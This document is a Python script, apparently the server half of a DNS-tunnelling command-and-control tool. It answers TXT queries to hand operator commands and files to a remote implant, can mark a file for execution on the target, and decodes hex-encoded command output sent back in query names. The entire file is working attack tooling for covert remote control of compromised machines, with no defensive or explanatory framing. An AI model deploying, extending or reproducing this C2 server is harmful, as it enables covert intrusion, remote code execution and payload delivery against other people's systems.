import socket
import glob
import json
from optparse import OptionParser

out: str = ''
size: int = 0
file: str = ''
command: str = ''


def load_zones():

    jsonzone = {}
    zonefiles = glob.glob('zones/*.zone')

    for zone in zonefiles:
        with open(zone) as zonedata:
            data = json.load(zonedata)
            zonename = data["$origin"]
            jsonzone[zonename] = data
    return jsonzone


zonedata = load_zones()


def getflags(flags):

    byte1 = bytes(flags[:1])
    byte2 = bytes(flags[1:2])

    rflags = ''

    QR = '1'

    OPCODE = ''
    for bit in range(1,5):
        OPCODE += str(ord(byte1)&(1<<bit))

    AA = '1'

    TC = '0'

    RD = '0'

    # Byte 2

    RA = '0'

    Z = '000'

    RCODE = '0000'

    return int(QR+OPCODE+AA+TC+RD, 2).to_bytes(1, byteorder='big') + int(RA+Z+RCODE, 2).to_bytes(1, byteorder='big')

def getquestiondomain(data):

    state = 0
    expectedlength = 0
    domainstring = ''
    domainparts = []
    x = 0
    y = 0
    for byte in data:
        if state == 1:
            if byte != 0:
                domainstring += chr(byte)
            x += 1
            if x == expectedlength:
                domainparts.append(domainstring)
                domainstring = ''
                state = 0
                x = 0
            if byte == 0:
                domainparts.append(domainstring)
                break
        else:
            state = 1
            expectedlength = byte
        y += 1

    questiontype = data[y:y+2]

    return (domainparts, questiontype)

def printreturn():
    global out
    print(out.replace(";", "\n").rstrip(",;0"))
    out = ''

def formatout(domain):
    global file
    printreturn()
    file = "False"

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': 'confirmed end'}]}

    return dictreturn


def sendfile(domain):
    global file

    f = open(file)
    f.seek(int(domain[1]))
    data = f.read(255)

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': data}]}

    return dictreturn


def pullchunks(domain):
    global out

    #c2id = domain[1]
    chunk = domain[1]
    out += bytes.fromhex(chunk).decode('utf-8')

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': chunk}]}

    return dictreturn


def sizefile(domain):
    global size
    sendsize = (int(size/255) + 1)
    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': str(sendsize)}]}

    return dictreturn


def getcommand(domain):
    global command

    dictreturn = {'txt': [{'name': '@', 'ttl': 400, 'value': str(command)}]}

    return dictreturn

def cases(domain):
    case = bytes.fromhex(domain[0]).decode('utf-8')

    options = {
        "end": formatout,
        "file": sendfile,
        "exec": pullchunks,
        "size": sizefile,
        "cmd": getcommand,
    }

    return options[case](domain)


def getzone(domain):
    global zonedata

    zone_name = '.'.join(domain)
    if zone_name in zonedata:
        return zonedata[zone_name]
    else:
        return cases(domain)

def getrecs(data):
    domain, questiontype = getquestiondomain(data)
    qt = ''
    if questiontype == b'\x00\x01':
        qt = 'a'
    elif questiontype == b'\x00\x02':
        qt = 'ns'
    elif questiontype == b'\x00\x10':
        qt = 'txt'
    else:
        zoneqt = [{'name': '@', 'ttl': 400, 'value': "bad request"}]
        return zoneqt, 'soa', domain

    zone = getzone(domain)

    return (zone[qt], qt, domain)


def buildquestion(domainname, rectype):
    qbytes = b''

    for part in domainname:
        length = len(part)
        qbytes += bytes([length])

        for char in part:
            qbytes += ord(char).to_bytes(1, byteorder='big')

    if rectype == 'a':
        qbytes += (1).to_bytes(2, byteorder='big')
    elif rectype == 'ns':
        qbytes += (2).to_bytes(2, byteorder='big')
    elif rectype == 'txt':
        qbytes += (16).to_bytes(2, byteorder='big')
    else:
        return qbytes

    qbytes += (1).to_bytes(2, byteorder='big')

    return qbytes


def rectobytes(domainname, rectype, recttl, recval):

    rbytes = b'\xc0\x0c'

    if rectype == 'a':
        rbytes += bytes([0]) + bytes([1])
    elif rectype == 'txt':
        rbytes += bytes([0]) + bytes([16])
    elif rectype == 'ns':
        rbytes += bytes([0]) + bytes([2])
    else:
        return rbytes

    rbytes += bytes([0]) + bytes([1])
    rbytes += int(recttl).to_bytes(4, byteorder='big')

    if rectype == 'a':
        rbytes += bytes([0]) + bytes([4])

        for part in recval.split('.'):
            rbytes += bytes([int(part)])
    elif rectype == 'ns':
        rbytes += bytes([0]) + bytes([6])
        part = recval.split('.')
        rbytes += (3).to_bytes(1, byteorder='big') + (part[0]).encode() + b'\xc0\x0c'
    elif rectype == 'txt':
        rbytes += (len(recval)+1).to_bytes(2, byteorder='big')
        rbytes += (len(recval)).to_bytes(1, byteorder='big')
        rbytes += recval.encode()
    return rbytes


def buildresponse(data):

    # Transaction ID
    TransactionID = data[:2]

    # Get the flags
    Flags = getflags(data[2:4])

    # Get answer for query
    records, rectype, domainname = getrecs(data[12:])

    # Question Count
    QDCOUNT = b'\x00\x01'

    # Answer Count
    ANCOUNT = (len(records)).to_bytes(2, byteorder='big')

    # Nameserver Count
    NSCOUNT = (0).to_bytes(2, byteorder='big')

    # Additonal Count
    ARCOUNT = (0).to_bytes(2, byteorder='big')

    dnsheader = TransactionID+Flags+QDCOUNT+ANCOUNT+NSCOUNT+ARCOUNT

    # Create DNS body
    dnsbody = b''

    dnsquestion = buildquestion(domainname, rectype)

    # start here, test output of records to determine a good default value if we get anything other than txt, a, or ns
    #if records !=
    for record in records:
        dnsbody += rectobytes(domainname, rectype, record["ttl"], record["value"])

    return dnsheader + dnsquestion + dnsbody


def main():
    global out
    global size
    global file
    global command

    parser = OptionParser()

    # IP address
    parser.add_option(
        "-a",
        "--address",
        help="IPv4 address to set as listener",
        action="store",
        type="string",
        dest="address",
        default='127.0.0.1'
    )

    # Send file
    parser.add_option(
        "-f",
        "--file",
        help="Send a file to the target machine. Provide absolute path",
        action="store",
        type="string",
        dest="file",
        default="False"
    )

    # Execute file
    parser.add_option(
        "-e",
        "--execute",
        help="Execute file assigned to --file option. --file option must be set",
        action="store_true",
        dest="execute",
        default=False
    )

    (options, args) = parser.parse_args()

    ip = options.address
    port = 53
    file = options.file
    execute = options.execute

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))

    while 1:
        if file != "False":
            f = open(file, 'rb')
            f.seek(0, 2)
            size = f.tell()
            if execute:
                command = "filex"
            else:
                command = "file"
        else:
            command = input("input: ")
        out += command + "\n"
        while len(out) != 0:
            data, addr = sock.recvfrom(512)
            r = buildresponse(data)
            sock.sendto(r, addr)


main()
